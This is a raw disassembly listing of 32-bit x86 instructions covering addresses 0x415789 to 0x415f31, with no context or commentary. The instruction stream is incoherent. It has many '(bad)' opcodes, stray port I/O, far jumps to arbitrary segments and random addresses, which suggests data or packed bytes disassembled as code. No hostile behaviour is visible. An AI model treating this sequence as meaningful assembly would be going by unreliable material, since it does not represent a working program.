  415789:	loope  0x4157c9
  41578b:	sub    BYTE PTR [edx],ch
  41578d:	cmc    
  41578e:	pop    eax
  41578f:	es mov ebp,0x27062f5d
  415795:	popf   
  415796:	mov    ?,WORD PTR [ebp-0x45]
  415799:	mov    bh,0xd5
  41579b:	fimul  DWORD PTR [edx]
  41579d:	push   ss
  41579e:	jae    0x41580a
  4157a0:	rcl    dl,cl
  4157a2:	add    DWORD PTR [esi+0x18f98],esp
  4157a8:	lea    esp,[ebx+0x50]
  4157ab:	adc    edi,edi
  4157ad:	add    DWORD PTR [eax+0x578be45a],ebx
  4157b3:	xor    esi,DWORD PTR [ebx-0x1be4f9e4]
  4157b9:	bswap  eax
  4157bb:	es (bad) 
  4157bd:	aam    0x84
  4157bf:	outs   dx,DWORD PTR ds:[esi]
  4157c0:	xchg   edi,eax
  4157c1:	ret    0xb9a2
  4157c4:	jmp    FWORD PTR [edx+0x810523c]
  4157ca:	sub    BYTE PTR [eax+0x2922bbe8],dl
  4157d0:	das    
  4157d1:	mov    al,0x9
  4157d3:	mov    esp,DWORD PTR [ecx-0x52b5af88]
  4157d9:	mul    BYTE PTR [edx]
  4157db:	push   0xffffffbd
  4157dd:	xchg   esp,eax
  4157de:	leave  
  4157df:	xchg   ebx,eax
  4157e0:	scas   al,BYTE PTR es:[edi]
  4157e1:	mov    ecx,0xed12fadb
  4157e6:	push   ebx
  4157e7:	stc    
  4157e8:	adc    DWORD PTR [ebp+0x34],eax
  4157eb:	mov    edx,0xb19fe6c9
  4157f0:	inc    eax
  4157f1:	pop    esi
  4157f2:	mov    ds:0x79115689,eax
  4157f7:	mov    ds:0xf14dec46,eax
  4157fc:	aad    0x2f
  4157fe:	scas   al,BYTE PTR es:[edi]
  4157ff:	(bad)  
  415800:	fwait
  415801:	jmp    0x1b92:0x67937cf9
  415808:	push   esi
  415809:	and    ebx,DWORD PTR [esi]
  41580b:	gs cwde 
  41580d:	(bad)
  415810:	pop    esp
  415811:	call   0x9d76:0x34e0d7d
  415818:	in     eax,dx
  415819:	fcomp  QWORD PTR ds:0x39a020a3
  41581f:	leave  
  415820:	imul   BYTE PTR ds:0x1cd7f7c0
  415826:	push   cs
  415827:	add    eax,0x5ea97208
  41582c:	in     eax,dx
  41582d:	les    ebx,FWORD PTR [edx-0x4d0b898]
  415833:	dec    edx
  415834:	in     al,dx
  415835:	and    dl,ah
  415837:	push   ebp
  415838:	mov    ch,0xb3
  41583a:	xchg   edx,eax
  41583b:	repz loopne 0x4157e2
  41583e:	mov    cl,al
  415840:	inc    ebx
  415841:	outs   dx,BYTE PTR ds:[esi]
  415842:	dec    ebx
  415843:	test   eax,0x73c421de
  415848:	sub    al,0x7f
  41584a:	cmp    ecx,DWORD PTR ds:0x15437c4d
  415850:	ret    0xb4d
  415853:	xor    al,0x90
  415855:	fs mov cl,0xa0
  415858:	pop    ebp
  415859:	lock (bad) 
  41585b:	clc    
  41585c:	(bad)  
  41585d:	dec    edi
  41585e:	dec    edx
  41585f:	add    BYTE PTR [esi],0x15
  415862:	and    al,0x7c
  415864:	shl    DWORD PTR [edx-0x2e],1
  415867:	pop    esp
  415868:	sbb    DWORD PTR [ebx-0x33],eax
  41586b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41586c:	aad    0xd7
  41586e:	and    eax,0x8d64a44b
  415873:	neg    BYTE PTR [ebx]
  415875:	scas   al,BYTE PTR es:[edi]
  415876:	shl    BYTE PTR [eax+0x29b9fdbb],1
  41587c:	ja     0x4158ec
  41587e:	cmc    
  41587f:	inc    esi
  415880:	scas   al,BYTE PTR es:[edi]
  415881:	shl    DWORD PTR [ecx+0x22],1
  415884:	in     al,0xb6
  415886:	adc    ch,dl
  415888:	pop    es
  415889:	inc    eax
  41588a:	fimul  DWORD PTR [edi]
  41588c:	xchg   ecx,eax
  41588d:	jo     0x41589b
  41588f:	in     al,dx
  415890:	loope  0x4158ee
  415892:	and    edx,0xffffffa5
  415895:	es cld 
  415897:	lods   eax,DWORD PTR ds:[esi]
  415899:	push   esi
  41589a:	mov    ebx,0xd935b7cc
  41589f:	xlat   BYTE PTR ds:[ebx]
  4158a0:	(bad)  
  4158a1:	out    dx,al
  4158a2:	jge    0x4158b6
  4158a4:	neg    DWORD PTR [ecx*8-0x77c59e02]
  4158ab:	add    ebp,edi
  4158ad:	push   ds
  4158ae:	push   ebx
  4158af:	enter  0x9b48,0x2f
  4158b3:	in     al,dx
  4158b4:	mov    ebp,0x488b5409
  4158b9:	cmp    BYTE PTR [ecx],bl
  4158bb:	mov    ecx,0x54dfc290
  4158c0:	inc    ecx
  4158c1:	clc    
  4158c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158c3:	into   
  4158c4:	nop
  4158c5:	into   
  4158c6:	ficom  DWORD PTR [edi-0x5fa4c3f4]
  4158cc:	in     eax,dx
  4158cd:	xchg   edi,eax
  4158ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158cf:	pop    ebp
  4158d0:	or     DWORD PTR ds:0x3f8209bf,esp
  4158d6:	test   DWORD PTR [edx+0x5bd9e450],edi
  4158dc:	jne    0x415954
  4158de:	out    0x5c,al
  4158e0:	test   DWORD PTR [ecx+esi*4-0x4b],edx
  4158e4:	jmp    0x676e6820
  4158e9:	sar    DWORD PTR [ebx+esi*4-0x4238d177],0x55
  4158f1:	das    
  4158f2:	mov    eax,0xad40e269
  4158f7:	aad    0x2a
  4158f9:	pop    ebx
  4158fa:	or     BYTE PTR [ecx+0x2c],bh
  4158fd:	jecxz  0x415966
  4158ff:	push   ecx
  415900:	test   DWORD PTR [esi-0x49],0x39a3906
  415907:	jno    0x4158fb
  415909:	outs   dx,BYTE PTR ds:[esi]
  41590a:	sbb    eax,0xe6225dd3
  41590f:	mov    ch,0x2c
  415911:	mov    gs,WORD PTR [edi+0x1bfd73af]
  415917:	(bad)  
  415918:	jo     0x41589e
  41591a:	iret   
  41591b:	add    eax,DWORD PTR [eax+0x3c716397]
  415921:	or     eax,0x148a6e94
  415926:	retf   0xded9
  415929:	inc    esi
  41592a:	mov    al,ds:0x56e95509
  41592f:	loop   0x415929
  415931:	loope  0x4158f4
  415933:	stos   BYTE PTR es:[edi],al
  415934:	rcl    DWORD PTR [eax],1
  415936:	mov    ecx,0x1c191ead
  41593b:	sbb    ebx,DWORD PTR [esi+0x6602369]
  415941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415942:	xlat   BYTE PTR ds:[ebx]
  415943:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415944:	daa    
  415945:	mov    ds:0x864b1194,al
  41594a:	outs   dx,DWORD PTR ds:[esi]
  41594b:	ret    
  41594c:	lock scas al,BYTE PTR es:[edi]
  41594e:	scas   al,BYTE PTR es:[edi]
  41594f:	stos   BYTE PTR es:[edi],al
  415950:	mov    esp,0x7541805
  415955:	cmp    al,0xfe
  415957:	push   ebp
  415958:	cmp    al,0xfa
  41595a:	pop    es
  41595b:	jae    0x4159ab
  41595d:	jl     0x415943
  41595f:	dec    edx
  415960:	or     eax,0x71e4f74
  415965:	ret    
  415966:	xchg   ebx,eax
  415967:	jle    0x4159b2
  415969:	or     ch,BYTE PTR [edx+0x79]
  41596c:	retf   0x5dba
  41596f:	(bad)  
  415970:	dec    esi
  415971:	pop    ss
  415972:	lods   al,BYTE PTR ds:[esi]
  415973:	xchg   ebx,eax
  415974:	add    eax,0x54b49f53
  415979:	retf   
  41597a:	cli    
  41597b:	aaa    
  41597c:	xchg   esi,eax
  41597d:	je     0x4159cd
  41597f:	popf   
  415980:	les    ebx,FWORD PTR [ebx-0x14]
  415983:	mov    bh,0xd7
  415985:	aaa    
  415986:	mov    ds:0x576d7d2e,al
  41598b:	sub    BYTE PTR [edx],bh
  41598d:	and    ah,BYTE PTR [esi-0x1db06dcd]
  415993:	mov    al,BYTE PTR [ebp+0x36]
  415996:	jbe    0x415989
  415998:	fdiv   QWORD PTR [edx]
  41599a:	sti    
  41599b:	mov    edx,0xa2da1b1d
  4159a0:	leave  
  4159a1:	sar    DWORD PTR [esi+0x414b4f42],1
  4159a7:	fist   WORD PTR [esi]
  4159a9:	adc    ah,BYTE PTR [esi]
  4159ab:	sbb    dl,dl
  4159ad:	inc    edi
  4159ae:	popf   
  4159af:	add    eax,0xd547e6e3
  4159b4:	shl    BYTE PTR [edi+0x39],0xb4
  4159b8:	popw   ss
  4159ba:	mov    dl,0x2f
  4159bc:	shr    BYTE PTR [eax+0x79],cl
  4159bf:	add    BYTE PTR [ecx+0x50],cl
  4159c2:	fisub  WORD PTR [ecx]
  4159c4:	popa   
  4159c5:	push   0xf8d98186
  4159ca:	hlt    
  4159cb:	dec    edi
  4159cc:	mov    al,0xd3
  4159ce:	or     ch,BYTE PTR [edx+0xc]
  4159d1:	scas   al,BYTE PTR es:[edi]
  4159d2:	lahf   
  4159d3:	aad    0xeb
  4159d5:	add    al,al
  4159d7:	or     ecx,edi
  4159d9:	sub    eax,0xb2c2973d
  4159de:	pushf  
  4159df:	or     al,0xb5
  4159e1:	shl    cl,1
  4159e3:	jmp    0x4d18d1b3
  4159e8:	scas   eax,DWORD PTR es:[edi]
  4159e9:	mov    edi,0xa720c510
  4159ee:	pop    eax
  4159ef:	push   esi
  4159f0:	inc    dx
  4159f2:	mov    eax,ss:0x7b5d7c34
  4159f8:	mov    edx,0x800406bf
  4159fd:	mov    esi,0xaef7f14b
  415a02:	mov    al,ds:0x15d16835
  415a07:	pop    edx
  415a08:	mov    dh,0xc2
  415a0a:	jge    0x4159ba
  415a0c:	cmp    ebp,DWORD PTR [edx]
  415a0e:	sbb    bh,bl
  415a10:	xchg   ebx,eax
  415a11:	pop    esp
  415a12:	dec    edi
  415a13:	or     DWORD PTR ds:0x6e28cfcf,ecx
  415a19:	or     BYTE PTR [ebx+ebp*4],bl
  415a1c:	or     DWORD PTR [edx],ebp
  415a1e:	push   esp
  415a1f:	jge    0x4159cb
  415a21:	dec    edx
  415a22:	or     eax,0xcf6b0853
  415a27:	push   ebx
  415a28:	test   DWORD PTR [edi],edi
  415a2a:	outs   dx,BYTE PTR ds:[esi]
  415a2b:	or     DWORD PTR [edi+0x71],ecx
  415a2e:	sbb    BYTE PTR [edi+0x178231db],ah
  415a34:	shl    al,1
  415a36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a37:	aaa    
  415a38:	popa   
  415a39:	mov    ecx,esp
  415a3b:	push   esp
  415a3c:	hlt    
  415a3d:	fwait
  415a3e:	sub    al,0x47
  415a40:	xchg   BYTE PTR [ecx],bh
  415a42:	in     al,0xd5
  415a44:	cmp    eax,0xe135224
  415a49:	retf   0xd76
  415a4c:	fadd   DWORD PTR [ecx+edi*8+0x64]
  415a50:	gs popa 
  415a52:	mov    ah,0x40
  415a54:	add    DWORD PTR [edx+0x4728209d],eax
  415a5a:	ins    DWORD PTR es:[edi],dx
  415a5b:	and    eax,0x5ecb719d
  415a60:	ss test eax,0xa5992da5
  415a66:	xor    al,0xf6
  415a68:	sahf   
  415a69:	or     DWORD PTR [ecx],eax
  415a6b:	out    dx,al
  415a6c:	iret   
  415a6d:	cmp    ebx,0x1a
  415a70:	(bad)  ds:0x129e4e65
  415a76:	lds    edi,FWORD PTR [eax-0x151b76f0]
  415a7c:	(bad)  
  415a7d:	mov    dl,0x6d
  415a7f:	push   edx
  415a80:	jg     0x415ac0
  415a82:	dec    esi
  415a83:	int3   
  415a84:	mov    eax,0x98c4b618
  415a89:	and    ebx,edi
  415a8b:	cwde   
  415a8c:	sub    al,BYTE PTR [ebp+0x14]
  415a8f:	test   eax,0x33473acc
  415a94:	dec    ecx
  415a95:	dec    ebx
  415a96:	cmp    edx,DWORD PTR ds:0x32103d73
  415a9c:	pop    ss
  415a9d:	mov    ecx,ebp
  415a9f:	dec    esp
  415aa0:	and    DWORD PTR [edx-0x68c9f27],ebx
  415aa6:	test   eax,0x154b6f5d
  415aab:	ret    
  415aac:	popf   
  415aad:	out    0xb4,al
  415aaf:	xlat   BYTE PTR ds:[ebx]
  415ab0:	xor    ah,al
  415ab2:	fst    QWORD PTR [ebp+eiz*2+0x457abe5d]
  415ab9:	(bad)  
  415abb:	js     0x415a55
  415abd:	sbb    bl,BYTE PTR [ebx-0x5e]
  415ac0:	dec    ecx
  415ac1:	pusha  
  415ac2:	popa   
  415ac3:	or     edx,ebx
  415ac5:	(bad)  
  415ac6:	dec    DWORD PTR [edx+0x32d84ea0]
  415acc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ace:	imul   edi,DWORD PTR ds:0x5bd862bc,0xfaad7b24
  415ad8:	daa    
  415ad9:	adc    DWORD PTR [ebx],ebp
  415adb:	(bad)  
  415adc:	leave  
  415add:	daa    
  415ade:	cmp    ah,bl
  415ae0:	xchg   edi,eax
  415ae1:	fsub   DWORD PTR [esi+0x34d42eba]
  415ae7:	adc    eax,0x78b628bc
  415aec:	jp     0x415afd
  415aee:	jmp    0xef090464
  415af3:	inc    edx
  415af4:	sahf   
  415af5:	dec    ebp
  415af6:	imul   DWORD PTR [eax]
  415af8:	jge    0x415a8c
  415afa:	push   ds
  415afb:	xchg   edx,eax
  415afc:	mov    ebp,0x798a2fd9
  415b01:	ds or  ecx,edx
  415b04:	add    al,ah
  415b06:	fwait
  415b07:	ror    BYTE PTR [edx],cl
  415b09:	mov    gs,WORD PTR [edx+0x4b7f0c3c]
  415b0f:	jmp    0xe2b8:0x851f7c6f
  415b16:	adc    DWORD PTR [esi-0x32],esi
  415b19:	or     al,0xba
  415b1b:	mov    bh,0x5f
  415b1d:	es mov eax,0x40470a8f
  415b23:	jg     0x415b6a
  415b25:	pop    ebp
  415b26:	test   al,0x77
  415b28:	pushf  
  415b29:	sub    dl,BYTE PTR [ebp+0x45]
  415b2c:	call   0x599cec54
  415b31:	jecxz  0x415b9a
  415b33:	pop    es
  415b34:	adc    al,0xe4
  415b36:	lea    edi,[ebx+ecx*1]
  415b39:	rol    edx,cl
  415b3b:	fucomip st,st(1)
  415b3d:	jns    0x415b10
  415b3f:	fisubr WORD PTR [eax]
  415b41:	outs   dx,DWORD PTR ds:[esi]
  415b42:	cld    
  415b43:	push   ebp
  415b44:	ror    BYTE PTR [ecx],0x22
  415b47:	mov    bl,0x67
  415b49:	mov    ebp,0xbdba784f
  415b4e:	xchg   ebx,eax
  415b4f:	inc    eax
  415b50:	jmp    0x4c3d:0x750c1f5b
  415b57:	adc    DWORD PTR [ecx],0x32b45d7c
  415b5d:	nop
  415b5e:	sub    al,0x46
  415b60:	and    BYTE PTR [eax],0xf3
  415b63:	pop    es
  415b64:	out    dx,al
  415b65:	fidivr DWORD PTR [esi+0x34]
  415b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b69:	es pop ebp
  415b6b:	dec    ecx
  415b6c:	cwde   
  415b6d:	loope  0x415b0a
  415b6f:	fnstcw WORD PTR [edx-0x2a]
  415b72:	std    
  415b73:	mov    ?,WORD PTR [edx-0x80]
  415b76:	or     eax,0xb2d7f2a5
  415b7b:	mov    ds,WORD PTR [ecx]
  415b7d:	retf   0x2728
  415b80:	js     0x415b96
  415b82:	ins    BYTE PTR es:[edi],dx
  415b83:	out    0x1c,eax
  415b85:	cli    
  415b86:	cld    
  415b87:	jecxz  0x415b73
  415b89:	retf   
  415b8a:	adc    eax,0x13b3a9e9
  415b8f:	pop    esi
  415b90:	sbb    eax,0xebf58e27
  415b95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b96:	test   BYTE PTR [esi],bl
  415b98:	sub    ah,BYTE PTR [edi+0x5d5205ab]
  415b9e:	test   DWORD PTR ds:0xcc971d8b,edx
  415ba4:	ss push esp
  415ba6:	hlt    
  415ba7:	adc    dh,dh
  415ba9:	cmc    
  415baa:	adc    DWORD PTR [ebx+esi*8+0x4f],ebp
  415bae:	div    BYTE PTR [ebx+0x7b]
  415bb1:	fidivr WORD PTR [ebx+ebp*4]
  415bb4:	(bad)  
  415bb5:	stc    
  415bb6:	push   0x14
  415bb8:	adc    DWORD PTR [edi+0x42],esi
  415bbb:	push   ebp
  415bbc:	mov    BYTE PTR [edi+0x3b],ch
  415bbf:	pushf  
  415bc0:	clc    
  415bc1:	icebp  
  415bc2:	les    edx,FWORD PTR [ebp-0x64]
  415bc5:	shl    BYTE PTR [eax+0x3d],0x68
  415bc9:	adc    al,0x16
  415bcb:	test   al,0x13
  415bcd:	lods   eax,DWORD PTR ds:[esi]
  415bce:	xchg   ebp,eax
  415bcf:	push   ecx
  415bd0:	pop    esp
  415bd1:	mov    WORD PTR [edx+0x64],cs
  415bd4:	jmp    0x2f3f05e0
  415bd9:	in     eax,dx
  415bda:	shr    cl,cl
  415bdc:	or     ebp,DWORD PTR [ebx+0x3c]
  415bdf:	gs jmp 0x3535:0x26ffd871
  415be7:	mov    ds:0x5c729558,al
  415bec:	shr    BYTE PTR [edi+eiz*1+0x7e],0x9d
  415bf1:	sub    BYTE PTR [eax+eiz*8+0x7a2e2c85],ah
  415bf8:	out    dx,eax
  415bf9:	jns    0x415b91
  415bfb:	outs   dx,BYTE PTR ds:[esi]
  415bfc:	scas   ax,WORD PTR es:[edi]
  415bfe:	(bad)
  415c01:	data16 and al,0xd
  415c04:	or     DWORD PTR [esi+ecx*4],0x35
  415c08:	loop   0x415bc5
  415c0a:	jmp    0xca83:0x59ca551d
  415c11:	out    dx,eax
  415c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c13:	lods   al,BYTE PTR ds:[esi]
  415c14:	push   edx
  415c15:	cmp    edi,DWORD PTR [ebx+0x46a17cf0]
  415c1b:	out    dx,al
  415c1c:	push   cs
  415c1d:	and    eax,0x1c4563d
  415c22:	cwde   
  415c23:	pop    ecx
  415c24:	push   es
  415c25:	loope  0x415ba8
  415c27:	cld    
  415c28:	sub    ebp,esi
  415c2a:	popf   
  415c2b:	push   0xffffffd9
  415c2d:	cdq    
  415c2e:	mov    eax,DWORD PTR [esi-0x7f6c4208]
  415c34:	cli    
  415c35:	je     0x415bde
  415c37:	mov    eax,0xe95d33f8
  415c3c:	div    BYTE PTR [edx]
  415c3e:	les    ecx,FWORD PTR [eiz*8-0x1f1b1019]
  415c45:	(bad)  
  415c46:	mov    WORD PTR [eax-0x52],fs
  415c49:	je     0x415c2a
  415c4b:	test   BYTE PTR [ebx+ebx*4-0x65],dl
  415c4f:	adc    al,0xa1
  415c51:	daa    
  415c52:	sbb    DWORD PTR [edi],ebp
  415c54:	jae    0x415c4a
  415c56:	les    eax,FWORD PTR ds:0xc64935c2
  415c5c:	fnstcw WORD PTR [edi]
  415c5e:	(bad)  
  415c5f:	push   eax
  415c60:	sub    cl,BYTE PTR [edi+edx*4]
  415c63:	lahf   
  415c64:	sti    
  415c65:	ja     0x415c9b
  415c67:	ins    BYTE PTR es:[edi],dx
  415c68:	dec    edi
  415c69:	lahf   
  415c6a:	rcl    DWORD PTR [esi-0x4ff3d724],1
  415c70:	int3   
  415c71:	or     BYTE PTR [edx-0x5de29b9b],bh
  415c77:	dec    esp
  415c78:	das    
  415c79:	sub    al,0xbe
  415c7b:	div    bl
  415c7d:	or     DWORD PTR [edi-0x60],edi
  415c80:	pop    eax
  415c81:	loop   0x415cf0
  415c83:	fwait
  415c84:	or     dh,BYTE PTR [edi+0x7d]
  415c87:	jl     0x415c7d
  415c89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c8a:	push   DWORD PTR [ecx-0x2bf013aa]
  415c90:	mov    DWORD PTR [ebx-0x47],0xb29575e5
  415c97:	xchg   ebp,eax
  415c98:	aam    0xa
  415c9a:	and    esi,DWORD PTR [ebx-0x53f490fa]
  415ca0:	mov    WORD PTR [ebp+0x6e1fbed0],fs
  415ca6:	arpl   WORD PTR [edx-0x70],dx
  415ca9:	ret    
  415caa:	dec    esp
  415cab:	cs pop ebp
  415cad:	inc    ebx
  415cae:	push   ds
  415caf:	jg     0x415cde
  415cb1:	push   ebx
  415cb2:	pop    es
  415cb3:	rcr    BYTE PTR ds:0x7004fd61,cl
  415cb9:	into   
  415cba:	in     eax,0xe6
  415cbc:	push   ss
  415cbd:	adc    al,BYTE PTR [eax+0x3c4181a3]
  415cc3:	sbb    dl,BYTE PTR [ebp+0x39cdcba8]
  415cc9:	je     0x415c8d
  415ccb:	cmp    al,0xc4
  415ccd:	mov    eax,ds:0xe801aa7d
  415cd2:	jle    0x415c77
  415cd4:	sti    
  415cd5:	cmp    cl,BYTE PTR [ebx-0x1b]
  415cd8:	pop    edi
  415cd9:	xchg   esp,eax
  415cda:	mov    BYTE PTR [edx],ah
  415cdc:	sub    eax,0x20d279fd
  415ce1:	jb     0x415c7b
  415ce3:	in     eax,0xa4
  415ce5:	mov    cl,bh
  415ce7:	fcmovb st,st(6)
  415ce9:	les    esi,FWORD PTR [ebp+0x44]
  415cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ced:	xchg   ecx,eax
  415cee:	pop    ebp
  415cef:	clc    
  415cf0:	aaa    
  415cf1:	jl     0x415d18
  415cf3:	(bad)  
  415cf4:	in     al,dx
  415cf5:	sbb    al,BYTE PTR ds:0x3c703e5c
  415cfb:	jecxz  0x415d46
  415cfd:	push   ebx
  415cfe:	out    0xe6,al
  415d00:	push   edi
  415d01:	pop    ds
  415d02:	inc    ebp
  415d03:	sti    
  415d04:	sbb    eax,DWORD PTR [edi]
  415d06:	movq   mm5,mm7
  415d09:	add    al,0x37
  415d0b:	(bad)  
  415d0c:	or     eax,0xcd99f588
  415d11:	push   0x41
  415d13:	fldenv [esi+0x5b]
  415d16:	lock inc ebp
  415d18:	leave  
  415d19:	fyl2xp1 
  415d1b:	imul   edi,DWORD PTR [esi],0x1a
  415d1e:	ret    
  415d1f:	adc    al,BYTE PTR [eax+0x59]
  415d22:	cwde   
  415d23:	call   DWORD PTR [edx]
  415d25:	test   BYTE PTR [ebp+0x405263f],ah
  415d2b:	jae    0x415d28
  415d2d:	outs   dx,BYTE PTR ds:[esi]
  415d2e:	mov    esi,0xb56e54c6
  415d33:	mov    ah,0x3b
  415d35:	dec    edi
  415d36:	pop    ecx
  415d37:	or     ebp,ebp
  415d39:	inc    edi
  415d3a:	xchg   ebx,eax
  415d3b:	gs xchg eax,eax
  415d3e:	and    edi,DWORD PTR [edi+0x77]
  415d41:	out    dx,eax
  415d42:	push   edi
  415d43:	nop
  415d44:	xor    al,0x65
  415d46:	adc    BYTE PTR [eax],bl
  415d48:	push   ss
  415d49:	dec    edx
  415d4a:	out    dx,eax
  415d4b:	es std 
  415d4d:	(bad)  
  415d4e:	jmp    0x415d3a
  415d50:	ror    DWORD PTR [ebx],1
  415d52:	xor    eax,0xa769a213
  415d57:	imul   eax,DWORD PTR [ebx-0x5dcc5562],0x61
  415d5e:	fs xor dh,bl
  415d61:	out    dx,eax
  415d62:	add    DWORD PTR [esi+0x3b0a691a],ebp
  415d68:	adc    al,0x6c
  415d6a:	hlt    
  415d6b:	xchg   ecx,ebp
  415d6d:	mov    cl,0xe1
  415d6f:	pop    ecx
  415d70:	pop    ecx
  415d71:	dec    edi
  415d72:	mov    dh,0x89
  415d74:	mov    ds:0xdcbfceac,eax
  415d79:	adc    esi,eax
  415d7b:	fidivr WORD PTR [edx+0x2e]
  415d7e:	pop    ebx
  415d7f:	mov    ds:0xb7cc2310,eax
  415d84:	pop    edi
  415d85:	mov    ?,WORD PTR [eax+0x773ef1e8]
  415d8b:	push   ecx
  415d8c:	mov    al,0x5f
  415d8e:	(bad)  
  415d8f:	jns    0x5c99e675
  415d95:	call   0x28e1:0x8a9f69d4
  415d9c:	xlat   BYTE PTR ss:[ebx]
  415d9e:	pop    esi
  415d9f:	cmp    BYTE PTR [ecx-0x4b],dl
  415da2:	xor    BYTE PTR [ecx+0x10],al
  415da5:	jno    0x415e1a
  415da7:	inc    eax
  415da8:	fsubr  st,st(2)
  415daa:	inc    ecx
  415dab:	sar    BYTE PTR [ebx-0x64fe20c3],cl
  415db1:	xchg   edi,eax
  415db2:	test   DWORD PTR [edi+edx*1],esi
  415db5:	push   ebx
  415db6:	test   eax,0x710757f5
  415dbb:	(bad)  
  415dbc:	aad    0xcb
  415dbe:	mov    bh,0xc3
  415dc0:	jge    0x415d4c
  415dc2:	loop   0x415dfc
  415dc4:	push   esp
  415dc5:	in     al,0x7f
  415dc7:	(bad)  
  415dc8:	(bad)  
  415dca:	rol    BYTE PTR [eax-0x4d],0x73
  415dce:	and    al,0x2f
  415dd0:	retf   
  415dd1:	hlt    
  415dd2:	jo     0x415e2d
  415dd4:	bound  edx,QWORD PTR [edx+0x1fcf06e]
  415dda:	mov    dl,0xb6
  415ddc:	jg     0x415dd9
  415dde:	pop    ecx
  415ddf:	js     0x415dd3
  415de1:	ds inc ebx
  415de3:	dec    eax
  415de4:	setb   bl
  415de7:	mov    eax,ds:0x55a9aed
  415dec:	call   0xf211:0x4debc66a
  415df3:	pop    esi
  415df4:	lods   eax,DWORD PTR ds:[esi]
  415df5:	cwde   
  415df6:	ja     0x415e6d
  415df8:	xchg   edi,eax
  415df9:	push   cs
  415dfa:	sbb    al,0xe8
  415dfc:	sti    
  415dfd:	and    DWORD PTR [ecx-0x665707de],edi
  415e03:	sbb    ebp,DWORD PTR [esi+0x768e57b9]
  415e09:	and    DWORD PTR [esi+ebx*1],0x1f
  415e0d:	push   esi
  415e0e:	mov    esp,0x1b162bc9
  415e13:	arpl   WORD PTR [ebx],ax
  415e15:	xchg   BYTE PTR [ecx],cl
  415e17:	repz mov bl,0xd8
  415e1a:	and    eax,ebp
  415e1c:	fwait
  415e1d:	cmp    dh,BYTE PTR [esi+ecx*1-0x649c4820]
  415e24:	int3   
  415e25:	or     ah,cl
  415e27:	push   ecx
  415e28:	push   ebx
  415e29:	mov    ecx,0x613d74af
  415e2e:	and    BYTE PTR [eax],0xec
  415e31:	fist   DWORD PTR [edi]
  415e33:	mov    ebx,0xfd7ebb69
  415e38:	adc    BYTE PTR [esp-0x7a],0xef
  415e3d:	push   esp
  415e3e:	sbb    DWORD PTR [edx],edi
  415e40:	mov    bl,0x4e
  415e42:	out    0x1,al
  415e44:	(bad)  
  415e45:	push   ds
  415e46:	inc    ebp
  415e47:	loopne 0x415e72
  415e49:	adc    DWORD PTR es:[ebp-0x6],ebx
  415e4d:	inc    eax
  415e4e:	mov    bh,0xae
  415e50:	sbb    eax,0xf3f33319
  415e55:	bound  esp,QWORD PTR [ebx]
  415e57:	inc    eax
  415e58:	push   0xd0433a50
  415e5d:	xchg   edx,eax
  415e5e:	test   BYTE PTR es:[edi-0x6542f15f],ch
  415e65:	jg     0x415e89
  415e67:	fwait
  415e68:	lock push edx
  415e6a:	stc    
  415e6b:	cmp    cl,BYTE PTR [eax]
  415e6d:	pop    es
  415e6e:	enter  0x1b9d,0xde
  415e72:	pop    es
  415e73:	inc    eax
  415e74:	jne    0x415e79
  415e76:	mov    WORD PTR [ebp+0x1b],?
  415e79:	adc    DWORD PTR [ebp-0x77173966],ebx
  415e7f:	xor    al,0xec
  415e81:	push   esi
  415e82:	dec    esi
  415e83:	mov    ah,0x41
  415e85:	and    eax,0x3f4fa0b7
  415e8a:	test   ah,0xcb
  415e8d:	test   DWORD PTR es:[ebp+0x574f4db9],0x3f750d8a
  415e98:	push   es
  415e99:	and    edx,0x7c
  415e9c:	(bad)  
  415e9d:	das    
  415e9e:	test   eax,edx
  415ea0:	mov    ds:0xaa73d530,eax
  415ea5:	inc    ebp
  415ea6:	test   BYTE PTR [ecx],bh
  415ea8:	xchg   edi,eax
  415ea9:	(bad)
  415eac:	add    al,0x2c
  415eae:	mov    al,BYTE PTR [eax-0x77]
  415eb1:	out    dx,eax
  415eb2:	sub    eax,DWORD PTR [edi]
  415eb4:	jmp    0x415e76
  415eb6:	push   ebx
  415eb7:	out    dx,eax
  415eb8:	mov    DWORD PTR [eax+0x465f13bb],ebp
  415ebe:	xor    eax,DWORD PTR [edx]
  415ec0:	mov    ah,0x5b
  415ec2:	cmp    edi,DWORD PTR [ecx-0x42]
  415ec5:	pop    ebx
  415ec6:	or     ebp,DWORD PTR [esi-0x559cb48b]
  415ecc:	mov    dl,0xd
  415ece:	pop    eax
  415ecf:	sub    eax,0xc86d0396
  415ed4:	cmc    
  415ed5:	aad    0xcc
  415ed7:	into   
  415ed8:	stos   BYTE PTR es:[edi],al
  415ed9:	jae    0x415f16
  415edb:	sbb    DWORD PTR [esi+0x6e],edx
  415ede:	mov    ebp,esp
  415ee0:	pop    esp
  415ee1:	lds    eax,FWORD PTR [esi+0x1bad7560]
  415ee7:	int    0x7a
  415ee9:	mov    edi,0xe494d882
  415eee:	mov    dl,0x8d
  415ef0:	jp     0x415f43
  415ef2:	sbb    BYTE PTR [ecx-0x54],ah
  415ef5:	int    0x90
  415ef7:	jae    0x415f69
  415ef9:	jo     0x415ecd
  415efb:	and    eax,0x97940d17
  415f00:	sbb    dh,BYTE PTR [esi]
  415f02:	push   0x3bcc48aa
  415f07:	jg     0x415f09
  415f09:	lock cmp al,0x4b
  415f0c:	into   
  415f0d:	iret   
  415f0e:	nop
  415f0f:	mov    ebp,0xd325d93f
  415f14:	mov    ch,0x7d
  415f16:	sbb    al,0x82
  415f18:	sub    al,0x4e
  415f1a:	(bad)  
  415f1c:	es iret 
  415f1e:	xchg   ebp,eax
  415f1f:	dec    ecx
  415f20:	push   0xae74879
  415f25:	shl    DWORD PTR [ecx],1
  415f27:	stc    
  415f28:	dec    edx
  415f29:	push   edi
  415f2a:	and    ebp,DWORD PTR [ebx-0x29]
  415f2d:	into   
  415f2e:	(bad)  
  415f2f:	xchg   ebx,eax
  415f30:	push   ebx
  415f31:	das    
